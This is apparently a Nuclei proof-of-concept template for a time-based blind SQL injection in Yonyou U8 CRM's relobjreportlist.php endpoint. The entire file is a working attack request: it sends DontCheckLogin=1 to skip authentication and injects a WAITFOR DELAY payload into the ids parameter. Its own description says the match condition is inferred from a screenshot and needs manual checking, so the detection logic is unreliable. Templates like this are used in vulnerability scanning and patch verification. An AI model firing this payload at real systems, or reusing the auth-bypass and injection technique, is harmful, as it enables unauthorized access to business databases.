id: poc-dfwik103t9qc0hrb
info:
  name: 用友U8CRM系统接口relobjreportlist.php存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /config/relobjreportlist.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: PHPSESSID=bgsesstimeout-;


    DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1'');WAITFOR DELAY ''0:0:5''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
